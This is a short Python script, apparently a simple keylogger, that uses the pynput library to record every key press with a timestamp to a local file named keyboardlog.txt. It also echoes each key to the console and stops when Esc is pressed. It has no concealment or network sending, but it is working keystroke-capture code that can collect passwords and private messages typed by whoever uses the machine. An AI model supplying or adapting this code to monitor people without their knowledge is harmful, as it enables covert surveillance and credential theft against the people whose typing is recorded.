from pynput import keyboard
import time

keyboard_log_file = "keyboardlog.txt"

def write_keyboard_log(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - "

    try:
        log_entry += f"{key.char}"
    except AttributeError:
        
        if key == keyboard.Key.space:
            log_entry += " "  # space
        elif key == keyboard.Key.enter:
            log_entry += "\n"  # newline
        elif key == keyboard.Key.tab:
            log_entry += "\t"  # tab
        elif key == keyboard.Key.backspace:
            log_entry += "[BACKSPACE]"
        else:
            log_entry += f"[{key.name if hasattr(key, 'name') else key}]"

    with open(keyboard_log_file, "a", encoding="utf-8") as f:
        f.write(log_entry)
        if not log_entry.endswith("\n"):
            f.write("\n")  

    print(log_entry.strip())  

def on_key_press(key):
    write_keyboard_log(key)

def on_key_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop the listener

with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
